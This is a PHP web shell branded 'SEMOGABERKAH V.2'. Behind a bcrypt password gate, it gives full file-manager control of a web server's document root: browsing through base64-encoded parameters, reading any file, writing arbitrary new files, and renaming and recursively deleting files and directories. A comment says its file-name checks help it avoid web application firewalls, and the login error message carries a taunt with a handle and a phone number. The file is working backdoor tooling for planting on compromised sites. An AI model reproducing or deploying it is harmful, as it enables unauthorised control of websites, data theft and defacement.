<?php
session_start();

// Check if the user is already logged in
if(isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    // If already logged in, display the main content
    showMainContent();
} else {
    // If not logged in, display the login page
    showLoginPage();
}

function showLoginPage() {
    // If the user submits the login form
    if(isset($_POST['password'])) {
        // Perform password verification using bcrypt hashing
        $password = $_POST['password'];
        $storedHash = '$2a$12$7Zac1GOSjyis9kol.BxTHuDBEfW7QzUa/0P6b4JnEqmCXKEnJ1IT60'; // Example hashed password
        
        if(password_verify($password, $storedHash)) { // Verify with the stored hashed password
            // Save login status to session
            $_SESSION['logged_in'] = true;
            
            // Redirect to the main page
            header("Location: ?");
            exit; // Stop script execution here to prevent further execution
        } else {
            // If the password is incorrect, display an error message
            $error = "Invalid password!...ditikung juga boss @sent_Qal 082210518066";
            
        }
    }
    ?>
    <?php echo (isset($error) ? '<p style="color: red;">'.$error.'</p>' : ''); ?>
    <form method="post" action="">
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
    </body>
    </html>
    <?php
}

function showMainContent() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <title>.:: SEMOGABERKAH V.2 ::.</title>
    <link href="https://fonts.googleapis.com/css?family=Protest Revolution" rel="stylesheet">
    <style>
    body {
    font-family: 'Arial Black', sans-serif;
    color: #fff;
    margin: 0;
    padding: 0;
    background-color: #242222c9;
    }
    .result-box-container {
    position: relative;
    margin-top: 20px;
    }
    
    .result-box {
    width: 100%;
    height: 200px;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    background-color: #f4f4f4;
    overflow: auto;
    box-sizing: border-box;
    font-family: 'Arial Black', sans-serif;
    color: #333;
    }
    
    .result-box::placeholder {
    color: #999;
    }
    
    .result-box:focus {
    outline: none;
    border-color: #128616;
    }
    
    .result-box::-webkit-scrollbar {
    width: 8px;
    }
    
    .result-box::-webkit-scrollbar-thumb {
    background-color: #128616;
    border-radius: 4px;
    }
    .container {
    max-width: 90%;
    margin: 20px auto;
    padding: 20px;
    background-color: #1e1e1e;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
    text-align: center;
    margin-bottom: 20px;
    }
    .header h1 {
    font-size: 24px;
    }
    .subheader {
    text-align: center;
    margin-bottom: 20px;
    }
    .subheader p {
    font-size: 16px;
    font-style: italic;
    }
    form {
    margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
    width: 100%;
    padding: 8px;
    margin-bottom: 10px;
    border: 1px solid #ddd;
    border-radius: 3px;
    box-sizing: border-box;
    }
    form input[type="submit"] {
    width: 100%;
    padding: 10px;
    background-color: #128616;
    color: white;
    border: none;
    border-radius: 3px;
    cursor: pointer;
    }
    .result-box {
    width: 100%;
    height: 200px;
    resize: none;
    overflow: auto;
    font-family: 'Arial Black';
    background-color: #f4f4f4;
    padding: 10px;
    border: 1px solid #ddd;
    margin-bottom: 10px;
    }
    form input[type="submit"]:hover {
    background-color: #143015;
    }
    table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
    }
    th, td {
    padding: 8px;
    text-align: left;
    }
    th {
    background-color: #5c5c5c;
    }
    tr:nth-child(even) {
    background-color: #9c9b9bce;
    }
    .item-name {
    max-width: 200px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    }
    .size, .date {
    width: 100px;
    }
    .permission {
    font-weight: bold;
    width: 50px;
    text-align: center;
    }
    .writable {
    color: #0db202;
    }
    .not-writable {
    color: #d60909;
    }
    textarea[name="file_content"] {
    width: calc(100.9% - 10px);
    margin-bottom: 10px;
    padding: 8px;
    max-height: 500px;
    resize: vertical;
    border: 1px solid #ddd;
    border-radius: 3px;
    font-family: 'Arial Black';
    }
    </style>.
    </head>
    <body>
    <?php
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    
    function x($b)
    {
        return base64_encode($b);
    }
    
    function y($b)
    {
        return base64_decode($b);
    }
    
    foreach ($_GET as $c => $d) $_GET[$c] = y($d);
    
    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);
    
    $viewCommandResult = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                echo '<hr>Folder created successfully!';
            } else {
                echo '<hr>Error: Folder already exists!';
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (unlink($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            } elseif (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                echo '<hr>Error: File or directory not found!';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    echo '<hr>Item renamed successfully!';
                } else {
                    echo '<hr>Error: Failed to rename item!';
                }
            } else {
                echo '<hr>Error: Item not found!';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView, FILE_USE_INCLUDE_PATH);
                $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Error: File not found!</p>';
            }
        } elseif (isset($_POST['new_file_name']) && isset($_POST['file_content'])) {
            $newFileName = $currentDirectory . '/' . $_POST['new_file_name'];
            $fileContent = $_POST['file_content'];
            if (!file_exists($newFileName)) {
                if (!empty($fileContent)) {
                    // Avoiding web application firewall attacks by checking file name validity
                    if (preg_match('/^[a-zA-Z0-9-_\.]+$/i', $_POST['new_file_name'])) {
                        if (file_put_contents($newFileName, $fileContent, LOCK_EX) !== false) {
                            echo '<hr>File created successfully!';
                        } else {
                            echo '<hr>Error: Failed to create file!';
                        }
                    } else {
                        echo '<hr>Error: Invalid file name!';
                    }
                } else {
                    echo '<hr>Error: File content is empty!';
                }
            } else {
                echo '<hr>Error: File already exists!';
            }
        }
    }
    ?>
    <center>
    <div class="fig-ansi">
    <pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: #4CAF50;"><strong>
     _____                          _             _                                       
    (  _  ) SEMOGABERKAH V.2       ( )           ( )                             _        
    | (_) | _   _   _    _ _   ___ | |__     __  | |/')    __   _ __   ___ ___  (_)  ___  
    |  _  |( ) ( ) ( ) /'_` )/',__)|  _ `\ /'__`\| , <   /'__`\( '__)/' _ ` _ `\| |/' _ `\
    | | | || \_/ \_/ |( (_| |\__, \| | | |(  ___/| |\`\ (  ___/| |   | ( ) ( ) || || ( ) |
    (_) (_)`\___x___/'`\__,_)(____/(_) (_)`\____)(_) (_)`\____)(_)   (_) (_) (_)(_)(_) (_)
    </strong> </span></pre>
    </div>
    </center>
    <hr>curdir:
    <?php
    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if ($index == 0) {
            echo '<a href="?d=' . x($dir) . '">' . $dir . '</a>';
        } else {
            $currentPath .= DIRECTORY_SEPARATOR . $dir;
            echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
        }
    }
    ?>
    <br>
    <hr>
    <form method="post" action="?<?= isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '' ?>">
        <input type="text" name="folder_name" placeholder="New Folder Name">
        <input type="submit" value="Create Folder">
    </form>
    <form method="post" action="?<?= isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '' ?>" enctype="multipart/form-data">
        <input type="text" name="new_file_name" placeholder="File Name">
        <p><textarea cols="30" rows="20" name="file_content" placeholder="File Content"></textarea></p>
        <input type="submit" value="Create File">
    </form>
    <?= $viewCommandResult ?>
    <div>
    </div>
    <table border=1>
        <br>
        <tr>
            <th>Item Name</th>
            <th>Size</th>
            <th>View</th>
            <th>Delete</th>
            <th>Rename</th>
        </tr>
        <?php
        foreach (scandir($currentDirectory) as $v) {
            $u = realpath($v);
            $s = stat($u);
            $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?' . ('d=' . x($currentDirectory) . '&f=' . x($v));
            echo '<tr><td class="item-name"><a href="' . $itemLink . '">' . $v . '</a></td><td>' . $s['size'] . '</td><td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="View"></form></td><td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="Delete"></form></td><td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="old_name" value="' . htmlspecialchars($v) . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td></tr>';
        }
        ?>
    </table>
    <?php
    
    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
    </body>
    </html>
    <?php
}
?>
